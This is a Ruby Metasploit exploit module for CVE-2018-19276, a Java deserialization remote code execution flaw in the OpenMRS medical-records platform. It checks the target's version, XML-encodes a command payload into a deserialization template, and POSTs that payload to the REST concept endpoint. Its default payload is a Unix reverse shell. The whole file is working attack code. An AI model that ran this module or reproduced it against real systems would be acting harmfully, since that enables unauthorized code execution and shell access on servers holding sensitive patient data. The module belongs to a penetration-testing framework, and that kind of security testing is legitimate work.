##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OpenMRS Java Deserialization RCE',
      'Description'    => %q(
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Nicola Serra', # Vuln Discovery and PoC
        'mpgn',         # PoC
        'Shelby Pace'   # Metasploit Module
      ],
      'References'     =>
       [
         [ 'CVE', '2018-19276' ],
         [ 'URL', 'https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607' ],
         [ 'URL', 'https://github.com/mpgn/CVE-2018-19276/' ]
       ],
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
       [
         [ 'Linux',
           {
             'Arch'            =>  ARCH_CMD,
             'Platform'        =>  'unix',
             'Payload'         =>  'cmd/unix/reverse',
           }
         ]
       ],
      'DisclosureDate' => "2019-02-04",
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      Opt::RPORT(8081),
      OptString.new('TARGETURI', [ true, 'Base URI for OpenMRS', '/' ])
    ])
  end

  def check
    res = send_request_cgi!('method' => 'GET', 'uri' => normalize_uri(target_uri.path))
    return CheckCode::Unknown("OpenMRS page unreachable.") unless res

    return CheckCode::Safe('Page discovered is not OpenMRS.') unless res.body.include?('OpenMRS')
    response = res.get_html_document
    version = response.at('body//h3')
    return CheckCode::Detected('Successfully identified OpenMRS, but cannot detect version') unless version && version.text

    version_no = version.text
    version_no = version_no.match(/\d\.\d+\.\d*/)
    return CheckCode::Detected('Successfully identified OpenMRS, but cannot detect version') unless version_no

    version_no = Gem::Version.new(version_no)
    not_vuln = Gem::Version.new('2.1.4')

    return CheckCode::Appears("OpenMRS platform version: #{version_no}") if (version_no < not_vuln) && ![ Gem::Version.new('1.11.8'), Gem::Version.new('1.11.9') ].include?(version_no)

    CheckCode::Detected
  end

  def format_payload
    payload_data = xml_encode(payload.encoded)
    payload_arr = payload_data.split(' ', 3)

    formatted_payload = ''
    payload_arr.each do |arg|
      formatted_payload << "<string>#{arg}</string>"
    end

    formatted_payload.gsub!("'", "")
  end

  def read_payload_data(payload_cmd)
    erb_path = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-19276', 'payload.erb')
    payload_data = File.binread(erb_path)
    payload_data = ERB.new(payload_data).result(binding)

  rescue Errno::ENOENT
    fail_with(Failure::NotFound, "Failed to find erb file at the given path: #{erb_path}")
  end

  def send_exploit
    xml_data = format_payload
    rest_uri = normalize_uri(target_uri.path, 'ws', 'rest', 'v1', 'concept')
    payload_data = read_payload_data(xml_data)

    print_status('Sending payload...')
    send_request_cgi(
      'method'    =>  'POST',
      'uri'       =>  rest_uri,
      'headers'   =>  { 'Content-Type'  =>  'text/xml' },
      'data'      =>  payload_data
    )
  end

  def xml_encode(str)
    str.gsub!(/&/, '&amp;')
    str.gsub!(/</, '&lt;')
    str.gsub!(/>/, '&gt;')
  end

  def exploit
    chk_status = check
    fail_with(Failure::NoTarget, 'Target is not vulnerable') unless (chk_status == CheckCode::Appears || chk_status == CheckCode::Detected)
    print_status('Target is running OpenMRS')

    send_exploit
  end
end
